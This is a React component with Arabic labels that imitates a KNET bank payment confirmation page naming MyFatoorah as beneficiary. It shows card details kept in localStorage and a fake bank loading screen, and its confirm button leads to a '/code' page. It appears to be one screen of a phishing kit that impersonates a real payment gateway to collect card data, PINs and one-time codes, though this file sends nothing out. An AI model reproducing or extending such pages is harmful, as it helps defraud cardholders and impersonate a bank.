import React, { useState, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import '../Style/Payment.css';

const Conn = () => {
  const navigate = useNavigate();
  const [cardData, setCardData] = useState(null);
  const [totalAmount, setTotalAmount] = useState(0);
  const [currency, setCurrency] = useState('');
  const [isLoading, setIsLoading] = useState(true); // حالة جديدة للتحميل
  
  // عند التحميل الأولي
  useEffect(() => {
    // جلب بيانات البطاقة من localStorage
    const storedCardData = localStorage.getItem('cardData');
    if (storedCardData) {
      setCardData(JSON.parse(storedCardData));
    }
    
    // جلب المبلغ والعملة من localStorage
    const storedTotal = localStorage.getItem('orderTotal');
    const storedCurrency = localStorage.getItem('orderCurrency');
    
    if (storedTotal) {
      setTotalAmount(parseFloat(storedTotal));
    }
    
    if (storedCurrency) {
      setCurrency(storedCurrency);
    }
    
    // إخفاء شاشة التحميل بعد 3 ثواني
    const timer = setTimeout(() => {
      setIsLoading(false);
    }, 3000);
    
    return () => clearTimeout(timer);
  }, []);

  const handleSubmit = async (e) => {
    e.preventDefault();
    navigate('/code');
  };

  const handleCancel = () => {
    navigate('/payment');
  };

  if (!cardData) {
    return (
      <div className="payment-loading-container">
        <div className="payment-loading-spinner"></div>
        <p>جارٍ تحميل البيانات...</p>
      </div>
    );
  }

  // تنسيق رقم البطاقة لعرض أول 6 أرقام وإخفاء 6 أرقام ثم عرض الباقي
  const formatCardNumber = (cardNumber) => {
    if (cardNumber.length >= 12) {
      const firstSix = cardNumber.substring(0, 6);
      const lastPart = cardNumber.substring(12);
      return `${firstSix}******${lastPart}`;
    }
    return cardNumber; // في حالة أن رقم البطاقة أقل من 12 رقماً
  };

  return (
    <div className="payment-container">
      {/* شاشة التحميل */}
      {isLoading && (
        <div className="loading-overlayy">
          <div className="spinnerr">
            <img 
              src="68315b_30dbad1140034a3da3c59278654e1655~mv2.gif" 
              alt="Loading" 
              className="loading-giff"
            />
          </div>
        </div>
      )}
      
      <div className="payment-header">
        <img src="/images/Bank.jpg" alt="Bank Header" className="bank-header-img" />
      </div>

      <div className="beneficiary-section">
        <div className="beneficiary-logo">
          <img src="/images/Bank-logo.jpg" alt="Bank Logo" className="bank-logo-img" />
        </div>
        <div className="did did1">
          <div className="beneficiary-title">المستفيد:</div>
          <div className="beneficiary-name">MyFatoorah</div>
        </div> 
        <div className="did">
          <div className="beneficiary-title">المبلغ:</div>
          <div className="beneficiary-name">
            {currency} {totalAmount.toFixed(3)}
          </div>
        </div>
      </div>

      <form onSubmit={handleSubmit} className="payment-form-container">
        <div className="payment-form">
          {/* عرض رقم البطاقة بالتنسيق الجديد */}
          <div className="form-groupp">
            <div className="form-label">
              <label>رقم بطاقة الصرف الآلي:</label>
            </div>
            <div className="form-roww form-roww1">
              <div className="card-number-input">
                <div className="card-info-display">
                  {formatCardNumber(cardData.cardNumber)}
                </div>
              </div>  
            </div>
          </div>
          
          {/* عرض تاريخ انتهاء البطاقة */}
          <div className="form-groupp">
            <div className="form-label">
              <label>شهر إنتهاء الصلاحية  :</label>
            </div>   
            <div className="form-roww form-roww2">
              <div className="mm">             
                <div className="expiry-info-display">
                  {cardData.expiryMonth}
                </div>
              </div>  
            </div>
          </div>
          <div className="form-groupp">
            <div className="form-label">
              <label>سنة إنتهاء الصلاحية  :</label>
            </div>   
            <div className="form-roww form-roww2">
              <div className="yy">
                <div className="expiry-info-display">
                  {cardData.expiryYear}
                </div>
              </div>   
            </div>
          </div>
          {/* عرض الرقم السري */}
          <div className="form-groupp form-groupp3">
            <div className="form-label">   
              <label>الرقم السري:</label>
            </div>    
            <div className="form-roww form-roww3">  
              <div className="cvv-input">
                <div className="cvv-info-display">
                  ****
                </div>
              </div>        
            </div>
          </div>
        </div>   
        <div className="form-buttons">
          <button type="submit" className="submitt-btn">
            تأكيد العملية
          </button>
          <button type="button" className="cancel-btn" onClick={handleCancel}>
            إلغاء
          </button>          
        </div>
      </form>

      <div className="payment-footer">
        جميع الحقوق محفوظة © 2025
        <br />
        <p>شركة الخدمات المصرفية الآلية المشتركة – كي نت</p>
      </div>
    </div>
  );
};

export default Conn;